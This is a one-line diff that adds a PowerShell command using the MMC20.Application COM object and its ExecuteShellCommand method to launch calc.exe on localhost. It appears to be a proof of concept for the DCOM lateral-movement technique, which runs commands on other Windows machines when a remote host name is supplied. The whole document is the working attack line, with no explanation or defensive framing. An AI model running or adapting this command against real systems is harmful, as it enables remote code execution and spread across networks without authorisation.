@@ -1,0 +1,1 @@
+[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","localhost")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
